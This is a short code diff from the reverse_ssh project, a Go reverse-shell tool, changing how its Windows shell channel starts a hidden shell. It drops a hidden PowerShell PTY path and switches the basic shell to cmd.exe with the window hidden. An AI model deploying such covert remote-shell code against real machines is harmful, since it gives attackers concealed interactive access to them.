@@ -12,7 +12,6 @@ import (
 
 	"github.com/ActiveState/termtest/conpty"
 	"github.com/NHAS/reverse_ssh/internal"
-	"github.com/NHAS/reverse_ssh/internal/client/shellhost"
 	"github.com/NHAS/reverse_ssh/internal/server/terminal"
 	"github.com/NHAS/reverse_ssh/internal/server/users"
 	"github.com/NHAS/reverse_ssh/pkg/logger"
@@ -47,12 +46,7 @@ func shellChannel(user *users.User, newChannel ssh.NewChannel, log logger.Logger
 			vsn := windows.RtlGetVersion()
 			if vsn.MajorVersion < 10 || vsn.BuildNumber < 17763 {
 				log.Info("Windows version too old for Conpty, using basic shell")
-				pwr, _ := exec.LookPath("powershell")
-				err := shellhost.Start_with_pty(pwr+" -windowstyle hidden", connection)
-				if err != nil {
-					log.Error("%s", err)
-				}
-
+				basicShell(log, connection)
 			} else {
 				ptyreq, _ := internal.ParsePtyReq(req.Payload)
 				err = conptyShell(requests, log, ptyreq, connection)
@@ -141,7 +135,7 @@ func basicShell(log logger.Logger, connection ssh.Channel) {
 		}
 	}()
 
-	cmd := exec.Command("powershell.exe")
+	cmd := exec.Command("cmd.exe")
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		HideWindow:    true,
 		CreationFlags: syscall.STARTF_USESTDHANDLES,
